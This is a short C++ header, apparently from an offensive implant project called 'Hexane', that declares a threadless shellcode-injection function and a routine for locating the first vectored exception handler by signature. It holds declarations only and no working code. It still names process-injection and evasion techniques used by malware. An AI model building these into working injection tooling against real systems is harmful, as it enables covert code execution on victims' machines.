#ifndef HEXANE_IMPLANT_INJECT_HPP
#define HEXANE_IMPLANT_INJECT_HPP
#include <core/corelib.hpp>

struct _threadless {
    A_BUFFER Parent;
    A_BUFFER Module;
    A_BUFFER Export;
    A_BUFFER Loader;
    A_BUFFER Opcode;
};

namespace Injection {

    FUNCTION VOID Threadless(_threadless Threadless, LPVOID shellcode, SIZE_T cbShellcode, SIZE_T ccbShellcode);

    namespace Veh {
        FUNCTION LPVOID GetFirstHandler(wchar_t *name, const char *signature, const char *mask);
    }
}
#endif //HEXANE_IMPLANT_INJECT_HPP
